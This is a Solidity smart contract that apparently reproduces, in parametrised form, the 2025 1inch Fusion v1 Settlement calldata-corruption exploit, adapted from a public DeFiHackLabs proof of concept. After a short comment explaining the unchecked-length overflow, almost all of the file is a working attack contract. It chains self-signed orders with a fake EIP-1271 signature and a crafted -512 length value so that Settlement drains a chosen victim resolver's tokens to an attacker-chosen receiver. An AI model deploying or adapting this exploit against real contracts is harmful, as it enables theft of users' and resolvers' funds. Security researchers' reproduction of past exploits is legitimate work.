// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

// C-23: 1inch Fusion v1 Settlement calldata-corruption exploit.
// Adapted (parametrised) from the public DeFiHackLabs PoC
// src/test/2025-03/OneInchFusionV1SettlementHack.sol_exp.sol (MIT), which reproduces
// the 2025-03-05 attack tx 0x62734Ce80311e64630a009Dd101a967eA0a9c012fabbfce8eac90f0f4ca090d6.
//
// Mechanism: Settlement._settleOrder (Yul, unchecked) appends a "suffix" at
//   ptr + interactionOffset + interactionLength  and patches
//   interactionLength += suffixLength, both unchecked. An attacker sets
//   interactionLength ~= -512 so the appended suffix is written over
//   attacker-controlled bytes, and the suffix read back by
//   fillOrderInteraction (DynamicSuffix.decodeSuffix) is fully attacker-chosen.
//   That lets Settlement call resolveOrders(victim) on any target with any
//   first argument, and lets the attacker route the victim's tokens to a
//   receiver of choice through a crafted (self-signed) limit order.

interface ISettlement {
    function settleOrders(bytes calldata data) external;
}

interface IERC20Like {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract OneInchAttack {
    struct Order {
        uint256 salt;
        address makerAsset;
        address takerAsset;
        address maker;
        address receiver;
        address allowedSender; // zero on public orders
        uint256 makingAmount;
        uint256 takingAmount;
        uint256 offsets;
        bytes interactions; // makerAssetData | takerAssetData | ... | postInteraction
    }

    address public immutable SETTLEMENT;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    bytes1 private constant _CONTINUE_INTERACTION = 0x00;
    bytes1 private constant _FINALIZE_INTERACTION = 0x01;

    constructor(address settlement) {
        SETTLEMENT = settlement;
    }

    // The attacker's contract is the maker of every order it fills; EIP-1271 makes
    // its own orders valid without an ECDSA key.
    function isValidSignature(bytes32, bytes calldata) external pure returns (bytes4) {
        return 0x1626ba7e;
    }

    function approveToken(address token, address spender, uint256 amount) external {
        (bool ok, bytes memory ret) =
            token.call(abi.encodeWithSelector(0x095ea7b3, spender, amount)); // approve(address,uint256)
        require(ok, "approve call failed");
        if (ret.length > 0) require(abi.decode(ret, (bool)), "approve returned false");
    }

    /// @param victim      resolver contract whose resolveOrders() will be invoked by Settlement
    /// @param resolverArg first argument passed to victim.resolveOrders() (must satisfy its check)
    /// @param token       ERC20 the victim pays with (also the taker asset of the crafted orders)
    /// @param amount      amount the victim pays; must be <= victim's balance
    /// @param receiver    attacker-controlled recipient of `amount`
    function attack(
        address victim,
        address resolverArg,
        address token,
        uint256 amount,
        address receiver
    ) external {
        uint256 FAKE_SIGNATURE_LENGTH_OFFSET = 0x240;
        uint256 FAKE_INTERACTION_LENGTH_OFFSET = 0x460;

        uint256 _PADDING = FAKE_INTERACTION_LENGTH_OFFSET - FAKE_SIGNATURE_LENGTH_OFFSET; // 544
        bytes memory zeroBytes = new bytes(_PADDING);

        // -512 as uint256; makes add(interactionLength, suffixLength) wrap to 0 and
        // add(interactionOffset, interactionLength) wrap backwards over zeroBytes.
        uint256 FAKE_INTERACTION_LENGTH =
            0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfFfffffffffffffffffffffe00;

        bytes memory interaction5;
        {
            Order memory sixthOrder = Order(
                0, // salt
                USDT, // makerAsset
                token, // takerAsset
                address(this), // maker
                receiver, // receiver
                SETTLEMENT, // allowedSender
                1, // makingAmount
                amount, // takingAmount
                0, // offsets
                hex""
            );
            // Hand-crafted suffix: totalFee=0, resolver=resolverArg, token=token,
            // rateBump=0, takingFee=0, empty tokensAndAmounts (length word 0).
            // fillOrderInteraction appends (token, result=amount) itself, so the
            // victim pays exactly `amount`. 87 zero bytes of padding between the
            // victim address and the suffix make the `data` argument decode as
            // (empty Address[], empty bytes[]) for ResolverExample-style victims.
            bytes memory dynamicSuffix =
                abi.encode(0, resolverArg, token, 0, 0, 0);
            bytes memory suffixPadding = new bytes(87);
            bytes memory finalOrderInteraction = abi.encodePacked(
                SETTLEMENT,
                _FINALIZE_INTERACTION,
                victim,
                suffixPadding,
                dynamicSuffix
            );
            interaction5 = abi.encodePacked(
                SETTLEMENT,
                _CONTINUE_INTERACTION,
                abi.encode(
                    sixthOrder,
                    FAKE_SIGNATURE_LENGTH_OFFSET,
                    FAKE_INTERACTION_LENGTH_OFFSET,
                    0,
                    amount,
                    0,
                    address(this)
                ),
                zeroBytes,
                FAKE_INTERACTION_LENGTH,
                finalOrderInteraction
            );
        }

        bytes memory signature = hex"";

        {
            Order memory fifthOrder = Order(
                0,
                USDT,
                token,
                address(this),
                address(this),
                SETTLEMENT,
                1,
                1,
                0,
                hex""
            );
            bytes memory interaction4 = abi.encodePacked(
                SETTLEMENT,
                _CONTINUE_INTERACTION,
                abi.encode(fifthOrder, signature, interaction5, 0, 1, 0, address(this))
            );

            Order memory fourthOrder = Order(
                1,
                USDT,
                token,
                address(this),
                address(this),
                SETTLEMENT,
                1,
                1,
                0,
                hex""
            );
            bytes memory interaction3 = abi.encodePacked(
                SETTLEMENT,
                _CONTINUE_INTERACTION,
                abi.encode(fourthOrder, signature, interaction4, 0, 1, 0, address(this))
            );

            Order memory thirdOrder = Order(
                2,
                USDT,
                token,
                address(this),
                address(this),
                SETTLEMENT,
                1,
                1,
                0,
                hex""
            );
            bytes memory interaction2 = abi.encodePacked(
                SETTLEMENT,
                _CONTINUE_INTERACTION,
                abi.encode(thirdOrder, signature, interaction3, 0, 1, 0, address(this))
            );

            Order memory secondOrder = Order(
                3,
                USDT,
                token,
                address(this),
                address(this),
                SETTLEMENT,
                1,
                1,
                0,
                hex""
            );
            bytes memory interaction = abi.encodePacked(
                SETTLEMENT,
                _CONTINUE_INTERACTION,
                abi.encode(secondOrder, signature, interaction2, 0, 1, 0, address(this))
            );

            Order memory orderStruct = Order(
                4,
                USDT,
                token,
                address(this),
                address(this),
                SETTLEMENT,
                1,
                1,
                0,
                hex""
            );

            bytes memory orderData =
                abi.encode(orderStruct, signature, interaction, 0, 1, 0, address(this));

            ISettlement(SETTLEMENT).settleOrders(orderData);
        }
    }
}
